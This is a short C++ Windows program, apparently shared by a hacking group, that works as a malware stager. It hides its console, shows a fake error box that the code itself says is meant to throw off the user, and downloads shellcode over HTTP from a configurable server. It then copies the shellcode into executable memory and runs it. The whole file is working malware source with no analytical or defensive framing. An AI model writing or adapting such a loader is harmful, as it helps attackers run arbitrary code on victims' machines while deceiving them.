// Coded by s1ege greetz to all GSH members
#include <winsock2.h>
#include "windows.h"
#include <iostream> 

#pragma comment(lib,"ws2_32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

using namespace std;

HINSTANCE hInst;
WSADATA wsaData;

int messagebox()
{
	int msgboxID = MessageBox(
		NULL,
		L"Error to throw off user. ",
		L"Error:",
		MB_ICONEXCLAMATION | MB_OK
	);
	return msgboxID;
}

int main()
{
	messagebox();
	WSADATA wsaData;
	SOCKADDR_IN SockAddr;
	char buf[8192];
	int bytesReceived;
	string response;

	// address hosting shellcode
	string server = "127.0.0.1";

	// HTTP GET, enter path to shellcode.txt file here..
	string get_http = "GET /shellcode.txt HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* host = gethostbyname(server.c_str());
	SockAddr.sin_port = htons(80);
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
	connect(sock, (SOCKADDR*)(&SockAddr), sizeof(SockAddr));

	// send HTTP GET request to server
	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);

	// store http response
	while ((bytesReceived = recv(sock, buf, 8192, 0)) > 0)
	{
		response += buf;
	}

	// convert shellcode string from http response into byte array
	string shellcode_str = response.substr(response.find("\r\n\r\n"));
	unsigned char shellcode[8192];
	for (int i = 0; i < shellcode_str.size() / 4; ++i)
	{
		shellcode[i] = std::strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
	}

	// allocate memory and execute shellcode in memory
	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

}
